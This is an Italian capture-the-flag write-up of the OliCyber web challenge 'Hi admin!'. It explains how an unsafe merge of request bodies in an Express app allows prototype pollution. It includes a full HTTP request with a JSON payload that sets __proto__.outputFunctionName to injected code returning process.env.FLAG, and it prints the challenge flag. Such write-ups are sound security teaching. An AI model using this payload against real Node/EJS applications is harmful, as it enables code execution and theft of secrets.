---
titolo: Hi admin!
data: 2026-10-06
categoria: Web
tags:
  - pollution
  - docker
---
## 1. Informazioni Generali
* **Piattaforma:** [olicyber.training.it]
* **Sezione:** [Selezione territoriale - Demo]
* **Difficoltà:** [Media]
* **Risorsa:** [http://hi-admin.challs.olicyber.it](http://hi-admin.challs.olicyber.it)

## 2. Analisi delle vulnerabilità
In questa challenge abbiamo un sito che ci dice che per ottenere la flag bisogna essere l'admin. Inoltre c'è una pagina con un **form** in cui ci chiede nome, hobby ed età, che vengono mostrati a schermo una volta inviati. 
```js
//index.js

const ADMIN_TOKEN = uuidv4() //randomized
...
...
...
app.use(function (req, res, next) {
    if (req.query.token && req.query.token === ADMIN_TOKEN)
        res.locals.adminLogged = true
    next()
})
```
Dal codice sopra preso dal file `index.js` vediamo che per diventare admin c'è bisogno di conoscere il valore di `ADMIN_TOKEN` per poter impostare il valore di `adminlogged` a true e leggere il valore della flag una volta che si accede. Il problema è che la funzione `uuidv4()` genera un id **univoco** impossibile da trovare, nemmeno tramite **bruteforce**. 
```js
//index.js
app.post('/hi', async (req, res) => {
    // default values
    let user = {
        name: 'random visitor',
        hobby: 'sleeping',
        age: '18',
    }

    merge(user, req.body)

    res.render('present_result', { user })
})
```
Quando viene fatta una richiesta **POST** all'endpoint `/hi` viene invocata la funzione `merge(user, req.body)`, che mette il **body** della richiesta nell'oggetto **json** `user`, andando a sovrascrivere eventuali parametri con nome uguale nei due oggetti. Questo permette di sfruttare una vulnerabilità chiamata **Prototype Pollution**. Consiste nell'iniettare codice malevolo all'interno delle proprietà **globali** degli oggetti del programma.
## 3. Exploitation
Si invia la seguente richiesta **POST** al server:
```http
POST /hi HTTP/1.1
Host: hi-admin.challs.olicyber.it
Content-Length: 95
Accept-Language: it-IT,it;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://hi-admin.challs.olicyber.it
Referer: http://hi-admin.challs.olicyber.it/hi
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

{
    "__proto__": {
        "outputFunctionName": "a; return process.env.FLAG; //"
    }
}
```
Andando a mandare quel **JSON** nel payload, andiamo a sovrascrivere l'attributo `outputFunctionName` della proprietà `__proto__` che hanno tutti gli oggetti. L'opzione `outputFunctionName` permette allo sviluppatore di definire il nome di una funzione personalizzata per stampare testo direttamente nel codice **HTML**, ma in questo caso gli abbiamo messo del codice malevolo che verrà eseguito, ottenendo così la seguente flag stampata:
```
flag{_p0llut10n_is_b4d_}
```
